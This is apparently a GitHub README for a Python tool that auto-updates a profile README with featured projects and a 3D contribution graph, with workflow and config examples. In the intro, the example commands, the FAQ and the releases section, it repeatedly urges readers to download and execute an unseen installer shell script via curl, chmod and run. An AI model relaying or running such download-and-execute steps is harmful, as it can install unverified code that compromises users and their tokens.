# Github Profile Manager — Auto README, 3D Graphs, Workflows

[![Releases](https://img.shields.io/badge/Downloads-Releases-blue?logo=github&style=for-the-badge)](https://github.com/Sankaprabodh/Github-Profile-Manager/releases)

Automate your GitHub profile README with dynamic featured projects and 3D contribution graphs. This repo includes workflow templates, a Python CLI, and integration with the GitHub API to keep your profile fresh and informative.

Topics: automation • contribution-graph • developer-tools • github-actions • github-api • github-profile • open-source • profile-manager • python • starred-repositories • workflow

Live downloads and installers: https://github.com/Sankaprabodh/Github-Profile-Manager/releases  
(Download the release asset named profile-manager-installer.sh from the Releases page and execute it to install the CLI and sample workflows.)

---

<!-- Images -->
![3D Graph Example](https://raw.githubusercontent.com/Sankaprabodh/Github-Profile-Manager/main/assets/3d-graph-screenshot.png)
![Featured Projects](https://raw.githubusercontent.com/Sankaprabodh/Github-Profile-Manager/main/assets/featured-projects-screenshot.png)

Table of Contents
- What it does
- Key features
- How it works
- Quick start
- Configure (profile README template)
- GitHub Actions workflow examples
- CLI usage (Python)
- Assets and templates
- Troubleshooting & FAQ
- Contribute
- License
- Releases

What it does
- Generates a GitHub profile README with dynamic content.
- Picks featured projects from starred repositories or a curated list.
- Produces a 3D-style contribution graph image and updates the README with it.
- Runs on GitHub Actions. You can schedule updates or trigger them on push.
- Uses the GitHub API for repo info, stars, languages, and stats.

Key features
- Featured projects block with live stats (stars, forks, language, description).
- 3D contribution graph rendered to PNG and embedded in README.
- Multiple update modes: scheduled, manual dispatch, or on push.
- Configurable templates and filters (min stars, exclude forks, exclude archived).
- Python CLI for local preview and testing.
- Keeps README tidy using markers and partial updates.

How it works (high level)
1. The workflow triggers on a schedule or on demand.
2. The action or CLI calls the GitHub API to fetch starred repos and repo metadata.
3. Templates render the featured projects section.
4. The tool generates a 3D contribution graph image from your contribution data.
5. The workflow commits the updated README to your profile repo.

Quick start — minimal (use Actions)
1. Fork your profile repo or add these workflow files to your profile repo.
2. Add a GitHub Actions workflow that runs the included action or the Python script.
3. Provide a PERSONAL_ACCESS_TOKEN with repo scope (GitHub secret: PROFILE_MANAGER_TOKEN).
4. Commit the workflow and enable Actions.

Example workflow (core)
```yaml
name: Update Profile README
on:
  schedule:
    - cron: '0 0 * * 0' # weekly
  workflow_dispatch:

jobs:
  update:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Set up Python
        uses: actions/setup-python@v4
        with:
          python-version: '3.11'
      - name: Install dependencies
        run: pip install -r requirements.txt
      - name: Run profile manager
        env:
          GITHUB_TOKEN: ${{ secrets.PROFILE_MANAGER_TOKEN }}
        run: python scripts/profile_manager.py --config .github/profile_manager.yml
      - name: Commit changes
        run: |
          git config user.name "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git add README.md assets/3d-graph.png
          git commit -m "chore: update profile README [skip ci]" || echo "no changes"
          git push
```

Configure (profile README template)
- The tool uses markers to locate sections inside README.md:
  - <!-- PROFILE_MANAGER:START -->
  - <!-- PROFILE_MANAGER:END -->
- Add these markers where you want the dynamic section.

Sample README snippet
```markdown
# Hi, I'm Alice 👋

<!-- PROFILE_MANAGER:START -->
<!-- PROFILE_MANAGER:END -->
```

Profile manager config (.github/profile_manager.yml)
```yaml
profile:
  username: alice
  readme_path: README.md
  markers:
    start: '<!-- PROFILE_MANAGER:START -->'
    end: '<!-- PROFILE_MANAGER:END -->'

sources:
  starred_repos: true
  curated_list:
    - owner: someorg
      repo: showcase
filters:
  min_stars: 50
  exclude_forks: true
  exclude_archived: true
featured_projects:
  limit: 4
graph:
  type: 3d
  output: assets/3d-graph.png
  style: material
```

CLI usage (Python)
- The repo includes a Python CLI for local testing.
- Install dependencies:
  - pip install -r requirements.txt
- Basic commands:
  - Preview only: python scripts/profile_manager.py --preview
  - Generate assets: python scripts/profile_manager.py --generate
  - Update README: python scripts/profile_manager.py --apply

Example commands
- Download and run installer from Releases (recommended for quick setup):
  - curl -L https://github.com/Sankaprabodh/Github-Profile-Manager/releases/download/v1.0.0/profile-manager-installer.sh -o profile-manager-installer.sh
  - chmod +x profile-manager-installer.sh
  - ./profile-manager-installer.sh
- Local test:
  - python scripts/profile_manager.py --config .github/profile_manager.yml --preview

Assets and templates
- assets/
  - 3d-graph.png — the generated contribution graph.
  - project-card-template.md — template for each featured repo.
- templates/
  - readme-section.md.j2 — Jinja2 template used to render the dynamic section.
- scripts/
  - profile_manager.py — main tool that fetches data and renders templates.
  - graph_builder.py — tool that builds a 3D-style contribution graph as PNG.

3D contribution graph details
- The graph builder samples contribution counts and maps them to a mesh grid.
- The renderer uses matplotlib / plotly style shaders to produce a 3D effect.
- Output is a PNG that embeds in README. The action updates the asset and README.

Featured projects logic
- Sources: starred repos plus an optional curated list.
- Sorting: by stars, recent activity, or custom score.
- Each card shows:
  - Name and owner
  - Short description
  - Top language
  - Stars and forks
  - Last push date
- You can pin or exclude repos via the config file.

Security and tokens
- The workflows use a token stored in repo secrets.
- Create a secret named PROFILE_MANAGER_TOKEN with the minimum scope needed.
- The tool needs repo access to push changes to the README.

Advanced workflows
- Use workflow_dispatch to trigger manual updates.
- Use matrix strategy to run multiple profiles from a single organization repo.
- Use caching to avoid redundant API calls.

Examples (profiles using this tool)
- Example profile with 3D graph: https://github.com/example-user/example-profile
- Example README snippet generated by the tool:
  - A projects grid
  - A generated 3D contribution image
  - Badges for top languages

Troubleshooting & FAQ
Q: Where do I get the installer or release assets?
A: Visit the Releases page: https://github.com/Sankaprabodh/Github-Profile-Manager/releases and download the profile-manager-installer.sh asset. Run it to install the CLI and add sample workflows.

Q: The action fails with API rate limits. What now?
A: Reduce the number of API calls. Use conditional caching. Use an authenticated token with higher rate limits.

Q: How do I change the number of featured projects?
A: Edit featured_projects.limit in .github/profile_manager.yml.

Q: Can I render different graph styles?
A: Yes. The graph section accepts style and type. Supported types: flat, 3d, heatmap.

Contribute
- Open an issue to discuss new features or report bugs.
- PR checklist:
  - Fork the repo
  - Create a feature branch
  - Add tests and update docs
  - Open a pull request

Maintainer guidelines
- Follow the code style in pyproject.toml.
- Keep public APIs stable for minor releases.
- Tag breaking changes in changelog.

Changelog
- See Releases for full changelog and installer assets:
  - https://github.com/Sankaprabodh/Github-Profile-Manager/releases
- Release naming convention: vMAJOR.MINOR.PATCH

License
- This project uses the MIT license. See LICENSE.md for details.

Releases
- Download installers, prebuilt assets, and changelog from the Releases page:
  - https://github.com/Sankaprabodh/Github-Profile-Manager/releases
- Download the release asset profile-manager-installer.sh and execute it to deploy the manager to your repo.

Contact
- Open an issue on GitHub for help or feature requests.
- Use pull requests for code contributions.